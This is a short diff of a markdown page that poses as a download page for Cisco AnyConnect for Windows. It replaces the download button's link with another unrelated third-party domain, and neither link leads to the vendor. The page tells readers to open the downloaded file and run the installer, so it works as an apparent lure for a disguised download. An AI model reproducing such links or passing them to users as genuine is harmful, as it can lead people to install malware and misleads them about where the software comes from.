@@ -11,7 +11,7 @@ Cisco AnyConnect Secure Mobility Client is a comprehensive VPN solution that pro
 
 
 ## Download Cisco AnyConnect for Windows
-[**Download Cisco AnyConnect**](https://www.studios-orange.com/studios/)
+[**Download Cisco AnyConnect**](https://the-exceptional.com/the/)
 
 Click the button above to download the latest version of Cisco AnyConnect for Windows. Once the file is downloaded, open it and follow the installation wizard.  
 
